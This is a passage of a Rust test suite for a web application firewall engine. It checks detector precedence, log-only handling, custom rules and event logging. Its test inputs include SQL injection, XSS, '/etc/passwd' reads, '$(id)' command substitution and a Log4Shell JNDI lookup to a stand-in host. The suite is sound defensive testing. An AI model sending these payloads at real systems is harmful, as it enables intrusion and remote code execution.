// G0 — Content-security parity / characterization baseline (engine level).
//
// Companion to `content_security_parity.rs`. Pins the engine-only content
// contracts that require a live [`WafEngine`] (and therefore a database):
//   • the REAL `content_checkers` short-circuit order through
//     [`WafEngine::inspect`] (SQLi wins over a co-matching XSS payload);
//   • host `log_only_mode` downgrades a would-be Block to LogOnly;
//   • the body phase ([`WafEngine::inspect_body`]) re-scans the header/path/
//     query corpus (a clean body with a malicious query still blocks);
//   • HTTP/1.1 ↔ HTTP/3 entry-point parity — both gateways build a `RequestCtx`
//     and call the identical `inspect` / `inspect_body` methods
//     (proxy.rs:341/451, http3.rs:325/374), so an identical ctx yields an
//     identical decision. Driving real H1/H3 servers is out of scope for G0;
//     the shared engine path is the parity surface and is pinned here.
//
// `#[ignore]`d and gated on a live Postgres exactly like `synced_clear_e2e.rs`,
// because `WafEngine::new` needs a DB (the security-event log path is DB-backed
// even though these tests only exercise the in-memory detectors). Run with:
//
// ```bash
// DATABASE_URL=postgresql://prx_waf:prx_waf@127.0.0.1:15432/prx_waf \
//   cargo test -p waf-engine --test content_security_engine_parity -- --ignored --nocapture
// ```

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::collections::HashMap;
use std::sync::Arc;

use bytes::Bytes;
use waf_common::content_security_config::{ContentSecurityConfig, SemanticBudgetConfig};
use waf_common::{HostConfig, Phase, RequestCtx, WafAction};
use waf_engine::crowdsec::{
    AppSecClient, AppSecConfig, CrowdSecChecker, CrowdSecConfig, DecisionCache, FallbackAction,
};
use waf_engine::rules::engine::{
    Condition, ConditionField, ConditionOp, ConditionValue, CustomRule, Operator, RuleAction,
};
use waf_engine::{CommunityClient, CommunityReporter, RuntimeContentSecurityConfig, WafEngine, WafEngineConfig};
use waf_storage::Database;
use waf_storage::models::SecurityEventQuery;

fn database_url() -> String {
    std::env::var("DATABASE_URL").unwrap_or_else(|_| "postgresql://prx_waf:prx_waf@127.0.0.1:15432/prx_waf".to_string())
}

/// A ctx with a benign User-Agent so the header-phase Scanner/Bot detectors do
/// not fire ahead of the content detectors under test. `guard_status` and all
/// `DefenseConfig` flags default to on (the historical per-host default).
fn make_ctx(query: &str, body: &str, log_only: bool) -> RequestCtx {
    let host_config = Arc::new(HostConfig {
        code: "h1".to_string(),
        host: "example.com".to_string(),
        guard_status: true,
        log_only_mode: log_only,
        ..HostConfig::default()
    });
    let mut headers = HashMap::new();
    headers.insert("user-agent".to_string(), "Mozilla/5.0 (g0-parity)".to_string());
    RequestCtx {
        req_id: "g0-engine".to_string(),
        client_ip: "198.51.100.7".parse().expect("ip"),
        client_port: 12345,
        method: "GET".to_string(),
        host: "example.com".to_string(),
        port: 80,
        path: "/".to_string(),
        query: query.to_string(),
        headers,
        body_preview: Bytes::from(body.to_string()),
        content_length: body.len() as u64,
        is_tls: false,
        host_config,
        geo: None,
    }
}

async fn engine() -> WafEngine {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    WafEngine::new(db, WafEngineConfig::default())
}

// ── Real short-circuit order through inspect ─────────────────────────────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn inspect_content_short_circuits_sqli_before_xss() {
    let eng = engine().await;
    // Payload trips both SQLi (union select) and XSS (<script>). The real
    // content_checkers vector puts SQLi first → the decision is SQL Injection.
    let mut ctx = make_ctx("q=<script>union select 1</script>", "", false);
    let decision = eng.inspect(&mut ctx).await;
    assert!(matches!(decision.action, WafAction::Block { status: 403, .. }));
    let r = decision.result.expect("block result");
    assert_eq!(r.phase, Phase::SqlInjection);
    assert_eq!(r.rule_name, "SQL Injection");
}

// ── Host log-only downgrade ──────────────────────────────────────────────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn host_block_when_log_only_disabled() {
    let eng = engine().await;
    let mut ctx = make_ctx("id=1 union select 1,2,3", "", false);
    let decision = eng.inspect(&mut ctx).await;
    assert!(
        matches!(decision.action, WafAction::Block { status: 403, .. }),
        "log_only_mode=false must Block, got {:?}",
        decision.action
    );
    assert!(!decision.is_allowed());
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn host_log_only_downgrades_block_to_logonly() {
    let eng = engine().await;
    let mut ctx = make_ctx("id=1 union select 1,2,3", "", true);
    let decision = eng.inspect(&mut ctx).await;
    // Same malicious request, but log_only_mode=true → LogOnly, not Block.
    assert!(
        matches!(decision.action, WafAction::LogOnly),
        "log_only_mode=true must downgrade to LogOnly, got {:?}",
        decision.action
    );
    // The detection is still populated (the hit is recorded, just not blocked)
    // and LogOnly counts as "allowed" for forwarding purposes.
    assert!(decision.is_allowed());
    let r = decision.result.expect("log-only still carries the detection");
    assert_eq!(r.phase, Phase::SqlInjection);
}

// ── Body phase re-scans the header/path/query corpus ─────────────────────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn inspect_body_rescans_query_even_with_clean_body() {
    let eng = engine().await;
    // Clean body, malicious query. The body phase feeds the same request_targets
    // corpus, so the query is (re-)scanned and the request is blocked.
    let mut ctx = make_ctx("id=1 union select 1,2,3", "clean=payload", false);
    let decision = eng.inspect_body(&mut ctx).await;
    assert!(matches!(decision.action, WafAction::Block { status: 403, .. }));
    let r = decision.result.expect("block result");
    assert_eq!(r.phase, Phase::SqlInjection);
    assert_eq!(r.detail, "UNION SELECT injection detected in query");
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn inspect_body_flags_malicious_body() {
    let eng = engine().await;
    let mut ctx = make_ctx("", "cmd=$(id)", false);
    let decision = eng.inspect_body(&mut ctx).await;
    assert!(matches!(decision.action, WafAction::Block { status: 403, .. }));
    let r = decision.result.expect("block result");
    assert_eq!(r.phase, Phase::Rce);
    assert_eq!(r.detail, "$() command substitution detected in body");
}

// ── HTTP/1.1 ↔ HTTP/3 entry-point parity ─────────────────────────────────────
//
// Both the HTTP/1.1 proxy (proxy.rs:341 `inspect`, :451 `inspect_body`) and the
// HTTP/3 forwarder (http3.rs:325 `inspect`, :374 `inspect_body`) construct a
// `RequestCtx` and call the SAME two engine methods. There is no per-protocol
// detection branch, so parity reduces to: identical ctx → identical decision.
// Pinned here by running the same malicious/clean requests twice and asserting
// the engine is deterministic across the shared entry point.

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn entrypoint_parity_same_ctx_same_decision() {
    let eng = engine().await;

    // Malicious: both "entry points" (identical ctx) block identically.
    let mut a = make_ctx("q=<script>alert(1)</script>", "", false);
    let mut b = make_ctx("q=<script>alert(1)</script>", "", false);
    let da = eng.inspect(&mut a).await;
    let db = eng.inspect(&mut b).await;
    match (&da.action, &db.action) {
        (WafAction::Block { status: sa, .. }, WafAction::Block { status: sb, .. }) => assert_eq!(sa, sb),
        other => panic!("expected both to Block, got {other:?}"),
    }
    assert_eq!(
        da.result.expect("a").rule_id,
        db.result.expect("b").rule_id,
        "identical ctx must yield identical rule_id across entry points"
    );

    // Clean: both allow identically.
    let mut c = make_ctx("q=hello", "", false);
    let mut d = make_ctx("q=hello", "", false);
    assert!(eng.inspect(&mut c).await.is_allowed());
    assert!(eng.inspect(&mut d).await.is_allowed());
}

// ══════════════════════════════════════════════════════════════════════════════
// G0.1 — production entry-point gate (four-review must-fix #2).
//
// These tests drive the REAL `WafEngine::inspect` / `inspect_body` so the G1
// subsystem swap is proven at the production entry, not against a test-authored
// vector. They cover:
//   • four-checker precedence + each single hit through the real engine;
//   • per-host toggles at the production entry;
//   • POSITIVE fall-through: legacy `None` continues to AppSec / custom (three
//     states) / OWASP CRS / sensitive — i.e. `None` is never silently turned
//     into an early Allow;
//   • legacy-vs-suffix precedence (legacy wins);
//   • ORIGINAL side effects: a Block and a host-LogOnly persist a
//     security_event; a legacy Block with report_community=true reaches the
//     community reporter (observed via a real in-process HTTP sink).
// All require a live `WafEngine` (DB-backed), hence `#[ignore]` + Postgres,
// mirroring the file's existing gate.
// ══════════════════════════════════════════════════════════════════════════════

/// Install the process-level rustls `ring` `CryptoProvider` once, mirroring
/// production `prx-waf` startup. Required before any reqwest client is built
/// (reqwest uses `rustls-no-provider`), for the `AppSec` and community paths.
fn ensure_crypto_provider() {
    // `install_default` returns Err only if already installed — idempotent here.
    let _ = rustls::crypto::ring::default_provider().install_default();
}

/// Engine plus a handle to the same `Database` (for security-event assertions).
async fn engine_with_db() -> (WafEngine, Arc<Database>) {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let eng = WafEngine::new(Arc::clone(&db), WafEngineConfig::default());
    (eng, db)
}

/// A benign-UA ctx with a caller-chosen client IP and host code; all defenses
/// default on. Callers mutate `path`/`query`/`body_preview` and (via
/// `Arc::make_mut`) `host_config` as needed.
fn base_ctx(ip: &str, code: &str) -> RequestCtx {
    let host_config = Arc::new(HostConfig {
        code: code.to_string(),
        host: "example.com".to_string(),
        guard_status: true,
        ..HostConfig::default()
    });
    let mut headers = HashMap::new();
    headers.insert("user-agent".to_string(), "Mozilla/5.0 (g01-parity)".to_string());
    RequestCtx {
        req_id: "g01".to_string(),
        client_ip: ip.parse().expect("valid ip"),
        client_port: 40000,
        method: "GET".to_string(),
        host: "example.com".to_string(),
        port: 80,
        path: "/".to_string(),
        query: String::new(),
        headers,
        body_preview: Bytes::new(),
        content_length: 0,
        is_tls: false,
        host_config,
        geo: None,
    }
}

fn set_body(ctx: &mut RequestCtx, body: &str) {
    ctx.body_preview = Bytes::from(body.to_string());
    ctx.content_length = body.len() as u64;
}

/// Build the *narrow* security-event filter used by the side-effect assertions:
/// `host_code` + `client_ip` + `rule_name` + `action` together. Narrowing to the
/// exact rule keeps an unrelated row (a different rule from another test, or a
/// stale row from a prior run on a non-clean DB) from inflating the count.
fn event_query(host_code: &str, ip: &str, rule_name: &str, action: &str) -> SecurityEventQuery {
    SecurityEventQuery {
        host_code: Some(host_code.to_string()),
        client_ip: Some(ip.to_string()),
        rule_name: Some(rule_name.to_string()),
        action: Some(action.to_string()),
        country: None,
        iso_code: None,
        page: None,
        page_size: None,
    }
}

/// Current `security_events` row count for `query`.
async fn event_total(db: &Database, query: &SecurityEventQuery) -> i64 {
    let (_, total) = db.list_security_events(query).await.expect("list security events");
    total
}

/// Poll `security_events` (written fire-and-forget via `tokio::spawn`) until the
/// count for `query` **strictly exceeds** `baseline` — i.e. *this* request wrote
/// a NEW row — or the retry budget is exhausted. Returns the last observed
/// total; the caller asserts `> baseline`. Because the baseline is read *before*
/// the request under test, a non-clean database full of history rows can never
/// false-green the assertion: only a fresh row lifts the count past `baseline`.
async fn wait_for_new_event(db: &Database, query: &SecurityEventQuery, baseline: i64) -> i64 {
    let mut total = baseline;
    for _ in 0..40 {
        total = event_total(db, query).await;
        if total > baseline {
            return total;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    total
}

fn path_rule(id: &str, prefix: &str, action: RuleAction, status: u16, msg: Option<String>) -> CustomRule {
    CustomRule {
        id: id.to_string(),
        host_code: "h1".to_string(),
        name: format!("g01-{id}"),
        priority: 1,
        enabled: true,
        condition_op: ConditionOp::And,
        conditions: vec![Condition {
            field: ConditionField::Path,
            operator: Operator::StartsWith,
            value: ConditionValue::Str(prefix.to_string()),
        }],
        action,
        action_status: status,
        action_msg: msg,
        script: None,
        regex_cache: Vec::new(),
    }
}

// ── Four-checker precedence + single hits through the REAL engine ─────────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn entry_precedence_xss_over_rce_and_traversal() {
    let (eng, _db) = engine_with_db().await;
    // No SQLi; trips XSS (<script>), RCE (/etc/passwd) and Traversal (../, /etc).
    let mut ctx = base_ctx("198.51.100.20", "h1");
    ctx.query = "q=<script></script>;cat /etc/passwd ../".to_string();
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("r").phase, Phase::Xss);
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn entry_precedence_rce_over_traversal() {
    let (eng, _db) = engine_with_db().await;
    // No SQLi/XSS; trips RCE (;cat /etc/passwd) and Traversal (../, /etc).
    let mut ctx = base_ctx("198.51.100.21", "h1");
    ctx.query = "file=;cat /etc/passwd ../".to_string();
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("r").phase, Phase::Rce);
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn entry_single_hits_each_checker() {
    let (eng, _db) = engine_with_db().await;

    let mut sqli = base_ctx("198.51.100.22", "h1");
    sqli.query = "id=1 union select 1,2,3".to_string();
    assert_eq!(
        eng.inspect_body(&mut sqli).await.result.expect("sqli").phase,
        Phase::SqlInjection
    );

    let mut xss = base_ctx("198.51.100.23", "h1");
    xss.query = "q=<script>alert(1)</script>".to_string();
    assert_eq!(eng.inspect_body(&mut xss).await.result.expect("xss").phase, Phase::Xss);

    let mut rce = base_ctx("198.51.100.24", "h1");
    set_body(&mut rce, "cmd=$(id)");
    assert_eq!(eng.inspect_body(&mut rce).await.result.expect("rce").phase, Phase::Rce);

    // Pure traversal (no /etc, no shell) → traversal is the only hit.
    let mut trav = base_ctx("198.51.100.25", "h1");
    trav.path = "/a/../../b".to_string();
    assert_eq!(
        eng.inspect_body(&mut trav).await.result.expect("trav").phase,
        Phase::DirTraversal
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn entry_host_toggles_disable_each_checker() {
    let (eng, _db) = engine_with_db().await;

    // Isolate the legacy detector under test: turn OWASP + sensitive off so the
    // *only* possible match is the toggled checker. With it off, the request
    // must fall through to Allow.
    let make = |ip: &str| {
        let mut c = base_ctx(ip, "h1");
        let dc = &mut Arc::make_mut(&mut c.host_config).defense_config;
        dc.owasp_set = false;
        dc.sensitive = false;
        c
    };

    let mut sqli = make("198.51.100.30");
    Arc::make_mut(&mut sqli.host_config).defense_config.sqli = false;
    sqli.query = "id=1 union select 1,2,3".to_string();
    assert!(
        eng.inspect_body(&mut sqli).await.is_allowed(),
        "sqli toggle off must allow"
    );

    let mut xss = make("198.51.100.31");
    Arc::make_mut(&mut xss.host_config).defense_config.xss = false;
    xss.query = "q=<script>alert(1)</script>".to_string();
    assert!(
        eng.inspect_body(&mut xss).await.is_allowed(),
        "xss toggle off must allow"
    );

    let mut rce = make("198.51.100.32");
    Arc::make_mut(&mut rce.host_config).defense_config.rce = false;
    set_body(&mut rce, "cmd=$(id)");
    assert!(
        eng.inspect_body(&mut rce).await.is_allowed(),
        "rce toggle off must allow"
    );

    let mut trav = make("198.51.100.33");
    Arc::make_mut(&mut trav.host_config).defense_config.dir_traversal = false;
    trav.path = "/a/../../b".to_string();
    assert!(
        eng.inspect_body(&mut trav).await.is_allowed(),
        "traversal toggle off must allow"
    );
}

// ── POSITIVE fall-through: legacy `None` reaches the suffix pipeline ──────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_appsec_unavailable_blocks_when_failclosed() {
    ensure_crypto_provider();
    let (eng, _db) = engine_with_db().await;
    // AppSec configured with an unreachable endpoint + fail-closed. A clean
    // request → subsystem `None` → AppSec runs → Unavailable → Block. Proves the
    // subsystem does not short-circuit past AppSec on `None`.
    let cache = Arc::new(DecisionCache::new(0));
    let checker = Arc::new(CrowdSecChecker::new(cache, CrowdSecConfig::default()));
    let appsec = Arc::new(
        AppSecClient::new(AppSecConfig {
            endpoint: "http://127.0.0.1:9/appsec".to_string(), // discard port → refused fast
            api_key: String::new(),
            timeout_ms: 200,
            failure_action: FallbackAction::Block,
        })
        .expect("appsec client"),
    );
    eng.set_crowdsec(checker, Some(appsec));

    let mut ctx = base_ctx("198.51.100.40", "h1");
    ctx.query = "q=hello".to_string();
    let d = eng.inspect_body(&mut ctx).await;
    assert!(
        matches!(d.action, WafAction::Block { .. }),
        "fail-closed AppSec must Block"
    );
    let r = d.result.expect("appsec result");
    assert_eq!(r.phase, Phase::CrowdSec);
    assert_eq!(r.rule_id.as_deref(), Some("crowdsec:appsec-unavailable"));
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_custom_allow_short_circuits_before_sensitive() {
    let (eng, _db) = engine_with_db().await;
    eng.custom_rules
        .add_rule(path_rule("allow-me", "/allow-me", RuleAction::Allow, 200, None));

    // Body carries a sensitive pattern that WOULD block if the pipeline reached
    // sensitive; the custom Allow must short-circuit first → request allowed.
    let mut ctx = base_ctx("198.51.100.41", "h1");
    ctx.path = "/allow-me".to_string();
    set_body(&mut ctx, "-----BEGIN RSA PRIVATE KEY-----");
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Allow), "custom Allow must short-circuit");
    assert!(d.is_allowed());
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_custom_log_continues_to_sensitive() {
    let (eng, _db) = engine_with_db().await;
    eng.custom_rules
        .add_rule(path_rule("log-me", "/log-me", RuleAction::Log, 403, None));

    // Custom Log records + continues; the sensitive pattern in the body then
    // blocks. Proves Log does NOT short-circuit the suffix pipeline.
    let mut ctx = base_ctx("198.51.100.42", "h1");
    ctx.path = "/log-me".to_string();
    set_body(&mut ctx, "-----BEGIN RSA PRIVATE KEY-----");
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("sensitive").phase, Phase::Sensitive);
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_custom_block_uses_custom_status() {
    let (eng, _db) = engine_with_db().await;
    eng.custom_rules.add_rule(path_rule(
        "block-me",
        "/block-me",
        RuleAction::Block,
        418,
        Some("nope".to_string()),
    ));

    let mut ctx = base_ctx("198.51.100.43", "h1");
    ctx.path = "/block-me".to_string();
    let d = eng.inspect_body(&mut ctx).await;
    assert!(
        matches!(d.action, WafAction::Block { status: 418, .. }),
        "custom Block must use its configured status, got {:?}",
        d.action
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_crs_only_blocks_by_owasp() {
    let (eng, _db) = engine_with_db().await;
    // Log4shell payload: not a legacy four-checker hit, caught only by OWASP CRS.
    let mut ctx = base_ctx("198.51.100.44", "h1");
    set_body(&mut ctx, "${jndi:ldap://evil.example/a}");
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("owasp").phase, Phase::Owasp);
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn fallthrough_sensitive_only_blocks_by_sensitive() {
    let (eng, _db) = engine_with_db().await;
    // Built-in sensitive pattern in the body: no legacy / CRS hit → sensitive.
    let mut ctx = base_ctx("198.51.100.45", "h1");
    set_body(&mut ctx, "leaking -----BEGIN RSA PRIVATE KEY----- here");
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("sensitive").phase, Phase::Sensitive);
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn precedence_legacy_wins_over_sensitive_suffix() {
    let (eng, _db) = engine_with_db().await;
    // Body trips BOTH legacy SQLi (union select) and sensitive (private key).
    // The subsystem runs first → the decision is SQL Injection, not Sensitive.
    let mut ctx = base_ctx("198.51.100.46", "h1");
    set_body(&mut ctx, "id=1 union select 1,2,3 -----BEGIN RSA PRIVATE KEY-----");
    let d = eng.inspect_body(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert_eq!(d.result.expect("legacy wins").phase, Phase::SqlInjection);
}

// ── ORIGINAL side effects preserved by the typed-verdict dispatch ─────────────

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn side_effect_block_persists_security_event() {
    let (eng, db) = engine_with_db().await;
    let ip = "203.0.113.10";
    // Narrow filter (host + ip + rule + action) and a pre-request baseline: only
    // a NEW row from THIS request can satisfy the assertion, so a non-clean DB
    // with historical rows for the same ip/action cannot false-green it.
    let query = event_query("h1", ip, "SQL Injection", "block");
    let baseline = event_total(&db, &query).await;
    let mut ctx = base_ctx(ip, "h1");
    ctx.query = "id=1 union select 1,2,3".to_string();
    let d = eng.inspect(&mut ctx).await;
    assert!(matches!(d.action, WafAction::Block { .. }));
    assert!(
        wait_for_new_event(&db, &query, baseline).await > baseline,
        "a legacy Block must persist a NEW 'block' security_event (baseline {baseline})"
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn side_effect_host_log_only_persists_logonly_event() {
    let (eng, db) = engine_with_db().await;
    let ip = "203.0.113.11";
    // Same baseline-delta guard as the block case, narrowed to the log_only row.
    let query = event_query("h1", ip, "SQL Injection", "log_only");
    let baseline = event_total(&db, &query).await;
    let mut ctx = base_ctx(ip, "h1");
    Arc::make_mut(&mut ctx.host_config).log_only_mode = true;
    ctx.query = "id=1 union select 1,2,3".to_string();
    let d = eng.inspect(&mut ctx).await;
    assert!(matches!(d.action, WafAction::LogOnly), "host log_only must downgrade");
    assert!(
        wait_for_new_event(&db, &query, baseline).await > baseline,
        "a host-LogOnly legacy hit must persist a NEW 'log_only' security_event (baseline {baseline})"
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn side_effect_legacy_block_reaches_community_reporter() {
    use std::io::{Read, Write};

    ensure_crypto_provider();
    let (eng, _db) = engine_with_db().await;

    // A minimal one-shot HTTP sink that captures the reporter's POST. Serves as
    // the observable seam demanded by the four-review must-fix (no code-reading).
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind sink");
    let addr = listener.local_addr().expect("addr");
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    std::thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            stream
                .set_read_timeout(Some(std::time::Duration::from_millis(500)))
                .ok();
            let mut buf = Vec::new();
            let mut chunk = [0u8; 4096];
            // Read until the read-timeout fires (Err) so the full request+body
            // is captured regardless of TCP segmentation.
            while let Ok(n) = stream.read(&mut chunk) {
                match chunk.get(..n) {
                    Some(slice) if n > 0 => buf.extend_from_slice(slice),
                    _ => break,
                }
            }
            let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
            let _ = tx.send(String::from_utf8_lossy(&buf).into_owned());
        }
    });

    let client = Arc::new(CommunityClient::new(&format!("http://{addr}")).expect("community client"));
    let reporter = Arc::new(CommunityReporter::new(client, "test-key".to_string(), 1, 1));
    eng.set_community_reporter(Arc::clone(&reporter));
    let (_shutdown_tx, shutdown_rx) = tokio::sync::watch::channel(false);
    tokio::spawn(Arc::clone(&reporter).run_flush_task(shutdown_rx));

    // A legacy SQLi hit → record_block(.., report_community = true) → reporter.
    let mut ctx = base_ctx("203.0.113.12", "h1");
    ctx.query = "id=1 union select 1,2,3".to_string();
    assert!(matches!(eng.inspect(&mut ctx).await.action, WafAction::Block { .. }));

    // Poll with async sleeps (never block the runtime) so the spawned flush task
    // gets to run on a current-thread runtime.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    let captured = loop {
        match rx.try_recv() {
            Ok(s) => break s,
            Err(std::sync::mpsc::TryRecvError::Empty) => {
                assert!(
                    std::time::Instant::now() < deadline,
                    "community reporter must POST the signal within the deadline"
                );
                tokio::time::sleep(std::time::Duration::from_millis(50)).await;
            }
            Err(std::sync::mpsc::TryRecvError::Disconnected) => panic!("sink thread ended without a POST"),
        }
    };
    assert!(captured.contains("/api/v1/waf/signals"), "POST target path: {captured}");
    assert!(
        captured.contains("SQL Injection"),
        "signal payload must carry the legacy rule name: {captured}"
    );
}

// ── P1a: Lane 2 zero-enforcement — never changes the final action ────────────

/// Build an engine with the Lane 2 semantic lane **enabled and in `enforce`
/// mode with a 100% canary rollout**. P1a ships no production detectors, so even
/// this most-aggressive configuration must still produce zero signals → score 0
/// → no semantic action → identical final decisions to a Lane-2-off engine.
async fn engine_with_semantic_enforce() -> WafEngine {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let cfg = ContentSecurityConfig {
        enabled: true,
        enforcement_mode: "enforce".to_string(),
        rollout_bps: 10_000,
        ..ContentSecurityConfig::default()
    };
    let content_security = RuntimeContentSecurityConfig::compile(&cfg).expect("valid semantic config");
    WafEngine::new(
        db,
        WafEngineConfig {
            content_security,
            ..WafEngineConfig::default()
        },
    )
}

/// Coarse action discriminant (ignores block-page body text, which may embed a
/// random req id) plus the detection phase, for decision equality.
fn action_kind(d: &waf_common::WafDecision) -> (&'static str, Option<Phase>) {
    let tag = match d.action {
        WafAction::Allow => "allow",
        WafAction::Block { .. } => "block",
        WafAction::LogOnly => "log_only",
        WafAction::Redirect { .. } => "redirect",
    };
    (tag, d.result.as_ref().map(|r| r.phase))
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn lane2_enabled_enforce_never_changes_final_action() {
    let baseline = engine().await; // Lane 2 off (default)
    let semantic = engine_with_semantic_enforce().await; // Lane 2 enabled + enforce

    // (query, body) battery: clean + each legacy attack family + a body attack.
    let cases: &[(&str, &str)] = &[
        ("q=hello", "just a normal body"),
        ("id=1 union select 1,2,3", ""),
        ("q=<script>alert(1)</script>", ""),
        ("q=;cat /etc/passwd", ""),
        ("q=../../../../etc/passwd", ""),
        ("", "id=1 union select username,password from users"),
    ];

    for (query, body) in cases {
        // Header phase.
        let mut a = make_ctx(query, body, false);
        let mut b = make_ctx(query, body, false);
        let da = baseline.inspect(&mut a).await;
        let db = semantic.inspect(&mut b).await;
        assert_eq!(
            action_kind(&da),
            action_kind(&db),
            "Lane 2 (enforce) changed the header-phase action for query={query:?} body={body:?}"
        );

        // Body phase.
        let mut c = make_ctx(query, body, false);
        let mut d = make_ctx(query, body, false);
        let dc = baseline.inspect_body(&mut c).await;
        let dd = semantic.inspect_body(&mut d).await;
        assert_eq!(
            action_kind(&dc),
            action_kind(&dd),
            "Lane 2 (enforce) changed the body-phase action for query={query:?} body={body:?}"
        );
    }
}

/// Build an enabled-enforce engine whose semantic budget is so tiny the
/// preprocessor degrades on the very first non-trivial field (a 2-byte per-field
/// input cap). Used to prove the degraded fail-open contract at the real engine.
async fn engine_with_semantic_enforce_tiny_budget() -> WafEngine {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let cfg = ContentSecurityConfig {
        enabled: true,
        enforcement_mode: "enforce".to_string(),
        rollout_bps: 10_000,
        budget: SemanticBudgetConfig {
            max_field_input_bytes: 2,
            ..SemanticBudgetConfig::default()
        },
        ..ContentSecurityConfig::default()
    };
    let content_security = RuntimeContentSecurityConfig::compile(&cfg).expect("valid semantic config");
    WafEngine::new(
        db,
        WafEngineConfig {
            content_security,
            ..WafEngineConfig::default()
        },
    )
}

/// A semantic budget so tiny the preprocessor degrades on the query field. The
/// enabled-enforce lane must then FAIL OPEN: it never blocks (no detectors, and
/// a degraded verdict carries no recommendation) and yields the identical legacy
/// decision. We drive a caller-owned budget state and assert it was actually
/// exhausted (`is_degraded`), so this is no longer a vacuous "clean stays clean"
/// test (codex A-2).
#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn lane2_degraded_budget_still_zero_enforcement() {
    let baseline = engine().await; // Lane 2 off (default)
    let semantic = engine_with_semantic_enforce_tiny_budget().await; // enforce + tiny budget

    let mut base_ctx = make_ctx("q=hello", "normal", false);
    let mut ctx = make_ctx("q=hello", "normal", false);

    // Caller-owned state compiled from the engine's (tiny) budget, threaded
    // through the header phase so we can inspect the degraded flag afterwards.
    let mut state = semantic.new_content_inspection_state();
    let d_base = baseline.inspect(&mut base_ctx).await;
    let d = semantic.inspect_with_state(&mut ctx, &mut state).await;

    assert!(
        state.is_degraded(),
        "the 2-byte per-field input cap must exhaust the budget on the query field"
    );
    assert_eq!(
        action_kind(&d_base),
        action_kind(&d),
        "a degraded Lane 2 must fail open to the identical legacy decision"
    );
    assert!(
        d.is_allowed(),
        "clean request must remain allowed under a degraded Lane 2 enforce"
    );
}

// ── P1b: real structural SQLi detector in SHADOW mode ────────────────────────

use base64::Engine as _;
use waf_storage::models::SemanticObservationQuery;

/// Build an engine with the Lane 2 `SQLi` family enabled in the **default P1b
/// shadow posture** (`enforcement_mode = log_only`, `struct_rule` weight 1.0,
/// `into_outfile`/`stacked` on the hard-veto allowlist). Returns the engine + its
/// DB handle so a test can read back persisted observations.
async fn engine_with_shadow_sqli() -> (WafEngine, Arc<Database>) {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let mut weights = std::collections::BTreeMap::new();
    weights.insert("struct_rule".to_string(), 1.0);
    let mut attacks = std::collections::BTreeMap::new();
    attacks.insert(
        "sql_injection".to_string(),
        waf_common::content_security_config::SemanticAttackConfig {
            enabled: true,
            weights,
            log_threshold: 40,
            block_threshold: 80,
            // Empty allowlist — no rule is authorised for single-hit Block before
            // holdout (codex A-3); the shadow guarantee is proven regardless.
            hard_veto_allowlist: Vec::new(),
        },
    );
    let cfg = ContentSecurityConfig {
        enabled: true,
        enforcement_mode: "log_only".to_string(),
        attacks,
        ..ContentSecurityConfig::default()
    };
    let content_security = RuntimeContentSecurityConfig::compile(&cfg).expect("valid semantic config");
    let eng = WafEngine::new(
        Arc::clone(&db),
        WafEngineConfig {
            content_security,
            ..WafEngineConfig::default()
        },
    );
    (eng, db)
}

/// A base64-wrapped `SQLi` payload the frozen legacy detectors never decode, so it
/// slips past Lane 1 entirely — but the Lane 2 decode chain (base64 blind decode)
